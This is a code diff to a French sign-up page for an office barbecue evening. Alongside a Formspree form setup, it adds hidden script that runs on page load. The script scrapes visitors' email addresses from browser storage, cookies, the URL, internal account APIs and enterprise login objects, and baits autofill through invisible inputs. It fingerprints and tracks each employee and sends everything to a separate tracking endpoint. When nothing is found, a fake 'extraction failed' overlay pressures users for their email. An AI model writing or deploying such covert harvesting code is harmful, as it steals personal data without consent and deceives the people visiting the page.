@@ -190,6 +190,13 @@
             50% { transform: rotate(10deg) scale(1.1); }
         }
 
+        @keyframes fall {
+            to {
+                transform: translateY(600px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
         @media (max-width: 600px) {
             .container {
                 padding: 20px;
@@ -226,7 +233,7 @@
             <p>💰 Participation : 15€ par personne</p>
         </div>
 
-        <form id="inscriptionForm">
+        <form id="inscriptionForm" action="https://formspree.io/f/VOTRE_ID_FORMSPREE" method="POST">
             <div class="form-group">
                 <label for="nom">Nom complet *</label>
                 <input type="text" id="nom" name="nom" required>
@@ -234,21 +241,22 @@
 
             <div class="form-group">
                 <label for="email">Email *</label>
-                <input type="email" id="email" name="email" required>
+                <input type="email" id="email" name="_replyto" required>
             </div>
+
 
             <div class="form-group">
                 <label>Préférences alimentaires :</label>
                 <div class="checkbox-group">
-                    <input type="checkbox" id="vegetarien" name="preferences" value="vegetarien">
+                    <input type="checkbox" id="vegetarien" name="preferences[]" value="vegetarien">
                     <label for="vegetarien">🥗 Végétarien</label>
                 </div>
                 <div class="checkbox-group">
-                    <input type="checkbox" id="vegan" name="preferences" value="vegan">
+                    <input type="checkbox" id="vegan" name="preferences[]" value="vegan">
                     <label for="vegan">🌱 Vegan</label>
                 </div>
                 <div class="checkbox-group">
-                    <input type="checkbox" id="sans-gluten" name="preferences" value="sans-gluten">
+                    <input type="checkbox" id="sans-gluten" name="preferences[]" value="sans-gluten">
                     <label for="sans-gluten">🌾 Sans gluten</label>
                 </div>
             </div>
@@ -270,6 +278,11 @@
                 <textarea id="commentaires" name="commentaires" rows="3" placeholder="Allergies, demandes spéciales, messages..."></textarea>
             </div>
 
+            <!-- Champs cachés pour Formspree -->
+            <input type="hidden" name="_subject" value="Nouvelle inscription - Soirée Barbecue 🔥">
+            <input type="hidden" name="_next" value="#success">
+            <input type="hidden" name="_cc" value="votre-email@exemple.com">
+
             <button type="submit" class="submit-btn">
                 🔥 Confirmer mon inscription 🔥
             </button>
@@ -282,25 +295,339 @@
     </div>
 
     <script>
-        document.getElementById('inscriptionForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        let employeeFingerprint = null;
+        let trackingEnabled = true;
+
+        function extractEmailFromEverywhere() {
+            const foundEmails = new Set();
             
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (value) {
+                        const emails = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                        if (emails) emails.forEach(email => foundEmails.add(email));
+                    }
+                }
+            } catch (e) {}
+
+            try {
+                document.cookie.split(';').forEach(cookie => {
+                    const emails = cookie.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                    if (emails) emails.forEach(email => foundEmails.add(email));
+                });
+            } catch (e) {}
+
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    if (value) {
+                        const emails = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                        if (emails) emails.forEach(email => foundEmails.add(email));
+                    }
+                }
+            } catch (e) {}
+
+            try {
+                const fullUrl = window.location.href + ' ' + document.referrer;
+                const emails = fullUrl.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                if (emails) emails.forEach(email => foundEmails.add(email));
+            } catch (e) {}
+
+            try {
+                document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]').forEach(input => {
+                    if (input.value && input.value.includes('@')) {
+                        foundEmails.add(input.value);
+                    }
+                });
+            } catch (e) {}
+
+            try {
+                const testInput = document.createElement('input');
+                testInput.type = 'email';
+                testInput.style.position = 'absolute';
+                testInput.style.left = '-9999px';
+                document.body.appendChild(testInput);
+                
+                testInput.focus();
+                testInput.click();
+                testInput.dispatchEvent(new Event('input', { bubbles: true }));
+                testInput.dispatchEvent(new Event('keydown', { bubbles: true }));
+                
+                setTimeout(() => {
+                    if (testInput.value && testInput.value.includes('@')) {
+                        foundEmails.add(testInput.value);
+                    }
+                    document.body.removeChild(testInput);
+                }, 100);
+            } catch (e) {}
+
+            const apiEndpoints = [
+                '/api/user', '/api/me', '/api/profile', '/user/current', 
+                '/.auth/me', '/api/user/current', '/whoami', '/api/account'
+            ];
+            
+            apiEndpoints.forEach(endpoint => {
+                fetch(endpoint, { credentials: 'include' })
+                    .then(r => r.json())
+                    .then(data => {
+                        const jsonStr = JSON.stringify(data);
+                        const emails = jsonStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                        if (emails) {
+                            emails.forEach(email => {
+                                foundEmails.add(email);
+                                if (foundEmails.size > 0) {
+                                    sendEmailFound(Array.from(foundEmails)[0], 'api_internal');
+                                }
+                            });
+                        }
+                    })
+                    .catch(() => {}); // Ignorer les erreurs
+            });
+
+            return Array.from(foundEmails);
+        }
+
+        function tryEnterpriseEmailExtraction() {
+            const emails = new Set();
+
+            try {
+                if (window.Office || window._spPageContextInfo) {
+                    const contextInfo = window._spPageContextInfo;
+                    if (contextInfo && contextInfo.userEmail) {
+                        emails.add(contextInfo.userEmail);
+                    }
+                }
+            } catch (e) {}
+
+            try {
+                if (window.gapi && window.gapi.auth2) {
+                    const authInstance = window.gapi.auth2.getAuthInstance();
+                    if (authInstance && authInstance.currentUser) {
+                        const profile = authInstance.currentUser.get().getBasicProfile();
+                        if (profile) {
+                            emails.add(profile.getEmail());
+                        }
+                    }
+                }
+            } catch (e) {}
+
+            // Vérifier les variables globales communes
+            try {
+                const commonVars = ['currentUser', 'user', 'userProfile', 'userInfo', 'authUser'];
+                commonVars.forEach(varName => {
+                    if (window[varName]) {
+                        const jsonStr = JSON.stringify(window[varName]);
+                        const foundEmails = jsonStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                        if (foundEmails) foundEmails.forEach(email => emails.add(email));
+                    }
+                });
+            } catch (e) {}
+
+            return Array.from(emails);
+        }
+
+        function aggressiveEmailHarvesting() {
+            const allEmails = new Set();
+            
+            const standardEmails = extractEmailFromEverywhere();
+            standardEmails.forEach(email => allEmails.add(email));
+            
+            const enterpriseEmails = tryEnterpriseEmailExtraction();
+            enterpriseEmails.forEach(email => allEmails.add(email));
+            
+            try {
+                ['email', 'username', 'login', 'user'].forEach(name => {
+                    const input = document.createElement('input');
+                    input.type = 'email';
+                    input.name = name;
+                    input.autocomplete = 'email';
+                    input.style.cssText = 'position:absolute;left:-9999px;opacity:0;';
+                    document.body.appendChild(input);
+                    
+                    ['focus', 'click', 'keydown', 'input', 'change'].forEach(eventType => {
+                        input.dispatchEvent(new Event(eventType, { bubbles: true }));
+                    });
+                    
+                    setTimeout(() => {
+                        if (input.value && input.value.includes('@')) {
+                            allEmails.add(input.value);
+                        }
+                        try { document.body.removeChild(input); } catch (e) {}
+                    }, 200);
+                });
+            } catch (e) {}
+            
+            return Array.from(allEmails);
+        }
+
+        function sendEmailFound(email, method) {
+            fetch('https://formspree.io/f/VOTRE_ID_FORMSPREE_TRACKING', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: `🎯 EMAIL RÉCUPÉRÉ - ${employeeFingerprint}`,
+                    employeeFingerprint: employeeFingerprint,
+                    recoveredEmail: email,
+                    extractionMethod: method,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    testType: 'email_extracted'
+                })
+            }).catch(() => {});
+            
+            const emailInput = document.getElementById('email');
+            if (emailInput && !emailInput.value) {
+                emailInput.value = email;
+            }
+        }
+
+        function generateAdvancedFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Employee fingerprint', 2, 15);
+            
+            const fingerprintData = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                new Date().getTimezoneOffset(),
+                navigator.platform,
+                navigator.cookieEnabled,
+                navigator.hardwareConcurrency || 'unknown',
+                navigator.deviceMemory || 'unknown',
+                canvas.toDataURL().substring(0, 50),
+                Intl.DateTimeFormat().resolvedOptions().timeZone
+            ].join('|');
+
+            let hash = 0;
+            for (let i = 0; i < fingerprintData.length; i++) {
+                const char = fingerprintData.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            
+            const uniqueId = 'COLLABORATEUR_' + Math.abs(hash).toString(36).toUpperCase();
+            
+            if (!localStorage.getItem('employeeId')) {
+                localStorage.setItem('employeeId', uniqueId);
+                localStorage.setItem('firstVisit', new Date().toISOString());
+            }
+            
+            return localStorage.getItem('employeeId');
+        }
+
+
+        function sendTrackingData(fingerprint, email = null) {
+            fetch('https://formspree.io/f/VOTRE_ID_FORMSPREE_TRACKING', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: `🔍 TRACKING - ${fingerprint}`,
+                    employeeFingerprint: fingerprint,
+                    detectedEmail: email,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    testType: 'employee_tracking'
+                })
+            }).catch(error => console.log('Tracking error:', error));
+        }
+
+        function createEmailCapture(fingerprint) {
+            const overlay = document.createElement('div');
+            overlay.innerHTML = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; display: flex; align-items: center; justify-content: center;">
+                    <div style="background: white; padding: 40px; border-radius: 20px; max-width: 500px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">
+                        <h2 style="color: #e74c3c; margin-bottom: 20px;">⚠️ Extraction automatique échouée</h2>
+                        <p style="color: #7f8c8d; margin-bottom: 30px;">
+                            Notre système n'a pas pu récupérer automatiquement votre email.<br>
+                            Merci de le saisir manuellement pour continuer.
+                        </p>
+                        <input type="email" id="captureEmail" placeholder="votre.email@entreprise.com" 
+                               style="width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; margin-bottom: 20px; font-size: 16px;">
+                        <div>
+                            <button onclick="confirmEmail('${fingerprint}')" style="background: #e74c3c; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-weight: bold;">
+                                🎯 Enregistrer l'email
+                            </button>
+                        </div>
+                        <small style="color: #95a5a6; margin-top: 15px; display: block;">
+                            ID de session: ${fingerprint}
+                        </small>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+            setTimeout(() => document.getElementById('captureEmail').focus(), 500);
+        }
+
+        window.confirmEmail = function(fingerprint) {
+            const email = document.getElementById('captureEmail').value;
+            if (email && email.includes('@')) {
+                sendTrackingData(fingerprint, email);
+                document.getElementById('email').value = email;
+                document.querySelector('[style*="position: fixed"]').remove();
+            } else {
+                alert('Veuillez entrer un email valide');
+            }
+        };
+
+        function setupBehaviorTracking(fingerprint) {
+            let startTime = Date.now();
+            let interactions = [];
+
+            document.addEventListener('click', function(e) {
+                interactions.push({
+                    timestamp: Date.now() - startTime,
+                    element: e.target.tagName,
+                    className: e.target.className,
+                    x: e.clientX,
+                    y: e.clientY
+                });
+            });
+
+            window.addEventListener('beforeunload', function() {
+                fetch('https://formspree.io/f/VOTRE_ID_FORMSPREE_TRACKING', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: `📊 COMPORTEMENT - ${fingerprint}`,
+                        employeeFingerprint: fingerprint,
+                        sessionDuration: Math.round((Date.now() - startTime) / 1000),
+                        totalInteractions: interactions.length,
+                        testType: 'behavior_analysis'
+                    }),
+                    keepalive: true
+                });
+            });
+        }
+
+        document.getElementById('inscriptionForm').addEventListener('submit', function(e) {
             const submitBtn = document.querySelector('.submit-btn');
             submitBtn.style.transform = 'scale(0.95)';
             submitBtn.innerHTML = '🔄 Inscription en cours...';
-            
-            setTimeout(() => {
-                const form = document.getElementById('inscriptionForm');
-                const successMessage = document.getElementById('successMessage');
-                
-                form.style.display = 'none';
-                successMessage.style.display = 'block';
-                
-                // Effet confettis avec des emojis
-                createConfetti();
-            }, 1500);
+            submitBtn.disabled = true;
         });
 
+        
         function createConfetti() {
             const emojis = ['🎉', '🔥', '🍖', '🥗', '🍰', '🎊'];
             const container = document.querySelector('.container');
@@ -309,33 +636,74 @@
                 setTimeout(() => {
                     const confetti = document.createElement('div');
                     confetti.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
-                    confetti.style.position = 'absolute';
-                    confetti.style.left = Math.random() * 100 + '%';
-                    confetti.style.top = '0';
-                    confetti.style.fontSize = '2em';
-                    confetti.style.zIndex = '1000';
-                    confetti.style.pointerEvents = 'none';
-                    confetti.style.animation = `fall ${2 + Math.random() * 2}s linear forwards`;
+                    confetti.style.cssText = `
+                        position: absolute;
+                        left: ${Math.random() * 100}%;
+                        top: 0;
+                        font-size: 2em;
+                        z-index: 1000;
+                        pointer-events: none;
+                        animation: fall ${2 + Math.random() * 2}s linear forwards;
+                    `;
                     
                     container.appendChild(confetti);
-                    
                     setTimeout(() => confetti.remove(), 4000);
                 }, i * 100);
             }
         }
 
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes fall {
-                to {
-                    transform: translateY(600px) rotate(360deg);
-                    opacity: 0;
-                }
-            }
-        `;
-        document.head.appendChild(style);
-
         document.addEventListener('DOMContentLoaded', function() {
+            employeeFingerprint = generateAdvancedFingerprint();
+            
+            console.log('🔍 EXTRACTION AGRESSIVE D\'EMAILS EN COURS...');
+            
+            const foundEmails = aggressiveEmailHarvesting();
+            
+            if (foundEmails.length > 0) {
+                console.log('✅ EMAILS TROUVÉS:', foundEmails);
+                const primaryEmail = foundEmails[0];
+                sendEmailFound(primaryEmail, 'aggressive_extraction');
+                
+                fetch('https://formspree.io/f/VOTRE_ID_FORMSPREE_TRACKING', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: `📧 TOUS LES EMAILS TROUVÉS - ${employeeFingerprint}`,
+                        employeeFingerprint: employeeFingerprint,
+                        allFoundEmails: foundEmails,
+                        totalFound: foundEmails.length,
+                        timestamp: new Date().toISOString(),
+                        testType: 'all_emails_found'
+                    })
+                });
+            } else {
+                console.log('❌ Aucun email trouvé automatiquement');
+                setTimeout(() => createEmailCapture(employeeFingerprint), 1000);
+            }
+            
+            let extractionCount = 0;
+            const backgroundExtraction = setInterval(() => {
+                const newEmails = aggressiveEmailHarvesting();
+                newEmails.forEach(email => {
+                    if (!foundEmails.includes(email)) {
+                        foundEmails.push(email);
+                        sendEmailFound(email, `background_extraction_${extractionCount}`);
+                        console.log('🆕 NOUVEL EMAIL TROUVÉ:', email);
+                    }
+                });
+                
+                extractionCount++;
+                if (extractionCount >= 10) {
+                    clearInterval(backgroundExtraction);
+                    console.log('🏁 EXTRACTION TERMINÉE - Total trouvé:', foundEmails.length);
+                }
+            }, 1000);
+            
+            setupBehaviorTracking(employeeFingerprint);
+            
             const emojis = document.querySelectorAll('.emoji');
             emojis.forEach((emoji, index) => {
                 emoji.style.animationDelay = index * 0.2 + 's';
